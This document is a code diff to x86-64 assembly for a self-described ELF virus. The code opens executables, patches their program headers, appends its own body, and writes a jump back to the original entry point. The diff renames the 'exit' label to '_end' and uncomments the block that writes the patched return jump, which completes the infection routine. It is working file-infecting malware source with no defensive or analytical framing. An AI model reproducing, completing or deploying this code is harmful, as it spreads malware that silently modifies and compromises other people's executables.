@@ -82,7 +82,7 @@ _start:
 
 		pop rdi
 		cmp rax, 0
-		jle	exit
+		jle	_end
 
 		mov rdi, rax
 		lea rsi, [r15 + 400]
@@ -111,7 +111,7 @@ _start:
             mov rax, SYS_OPEN
             syscall
 
-            cmp rax, 0                                          ; if can't open file, exit now
+            cmp rax, 0                                          ; if can't open file, _end now
             jle .continue
             mov r9, rax  
 		.read_ehdr:
@@ -147,7 +147,7 @@ _start:
 
 			inc rbx                                             ; if not, increase rbx counter
 			cmp bx, word [r15 + 200]                            ; check if we looped through all phdrs already (ehdr.phnum = [r15 + 200])
-			jge .close_file                                     ; exit if no valid phdr for infection was found
+			jge .close_file                                     ; _end if no valid phdr for infection was found
 
 			add r8w, word [r15 + 198]                           ; otherwise, add current ehdr.phentsize from [r15 + 198] into r8w
 			jnz .loop_phdr                                      ; read next phdr
@@ -183,7 +183,7 @@ _start:
 				; writing virus body to EOF
 				mov rdi, r9                                     ; r9 contains fd
 				lea rsi, [rbp + _start]                        ; loading _start address in rsi
-				mov rdx, exit - _start                       ; virus size
+				mov rdx, _end - _start                       ; virus size
 				mov r10, rax                                    ; rax contains target EOF offset from previous syscall
 				mov rax, SYS_PWRITE64
 				syscall
@@ -201,8 +201,8 @@ _start:
                 add r13, 0xc000000                              ; adding 0xc000000 to target file size
                 mov [r15 + 224], r13                            ; changing phdr.vaddr in [r15 + 224] to new one in r13 (stat.st_size + 0xc000000)
                 mov qword [r15 + 256], 0x200000                 ; set phdr.align in [r15 + 256] to 2mb
-                add qword [r15 + 240], exit - _start + 5     ; add virus size to phdr.filesz in [r15 + 240] + 5 for the jmp to original ehdr.entry
-                add qword [r15 + 248], exit - _start + 5     ; add virus size to phdr.memsz in [r15 + 248] + 5 for the jmp to original ehdr.entry
+                add qword [r15 + 240], _end - _start + 5     ; add virus size to phdr.filesz in [r15 + 240] + 5 for the jmp to original ehdr.entry
+                add qword [r15 + 248], _end - _start + 5     ; add virus size to phdr.memsz in [r15 + 248] + 5 for the jmp to original ehdr.entry
 
                 ; writing patched phdr
                 mov rdi, r9                                     ; r9 contains fd
@@ -234,32 +234,32 @@ _start:
                 cmp rax, 0
                 jle .close_file
 
-            ; .write_patched_jmp:
-            ;     ; getting target new EOF
-            ;     mov rdi, r9                                     ; r9 contains fd
-            ;     mov rsi, 0                                      ; seek offset 0
-            ;     mov rdx, SEEK_END
-            ;     mov rax, SYS_LSEEK
-            ;     syscall                                         ; getting target EOF offset in rax
+            .write_patched_jmp:
+                ; getting target new EOF
+                mov rdi, r9                                     ; r9 contains fd
+                mov rsi, 0                                      ; seek offset 0
+                mov rdx, SEEK_END
+                mov rax, SYS_LSEEK
+                syscall                                         ; getting target EOF offset in rax
 
-            ;     ; creating patched jmp
-            ;     mov rdx, [r15 + 224]                            ; rdx = phdr.vaddr
-            ;     add rdx, 5
-            ;     sub r14, rdx
-            ;     sub r14, exit - _start
-            ;     mov byte [r15 + 300 ], 0xe9
-            ;     mov dword [r15 + 301], r14d
+                ; creating patched jmp
+                mov rdx, [r15 + 224]                            ; rdx = phdr.vaddr
+                add rdx, 5
+                sub r14, rdx
+                sub r14, _end - _start
+                mov byte [r15 + 300 ], 0xe9
+                mov dword [r15 + 301], r14d
 
-            ;     ; writing patched jmp to EOF
-            ;     mov rdi, r9                                     ; r9 contains fd
-            ;     lea rsi, [r15 + 300]                            ; rsi = patched jmp in stack buffer = [r15 + 208]
-            ;     mov rdx, 5                                      ; size of jmp rel
-            ;     mov r10, rax                                    ; mov rax to r10 = new target EOF
-            ;     mov rax, SYS_PWRITE64
-            ;     syscall
+                ; writing patched jmp to EOF
+                mov rdi, r9                                     ; r9 contains fd
+                lea rsi, [r15 + 300]                            ; rsi = patched jmp in stack buffer = [r15 + 208]
+                mov rdx, 5                                      ; size of jmp rel
+                mov r10, rax                                    ; mov rax to r10 = new target EOF
+                mov rax, SYS_PWRITE64
+                syscall
 
-            ;     cmp rax, 0
-            ;     jbe .close_file
+                cmp rax, 0
+                jbe .close_file
 
                 mov rax, SYS_SYNC                               ; commiting filesystem caches to disk
                 syscall
@@ -303,7 +303,7 @@ cleanup:
     add rsp, 5000                                               ; restoring stack so host process can run normally, this also could use some improvement
     ; pop rsp
     ; pop rdx
-	jmp exit
+	jmp _end
 print_dot:
 	push rbx
 	mov rdi, 1
@@ -326,7 +326,7 @@ err:
 	mov rax, SYS_EXIT
 	mov rdi, 0xfffffff
 	syscall
-exit:
+_end:
 	mov rax, SYS_EXIT
 	xor rdi, rdi
 	syscall
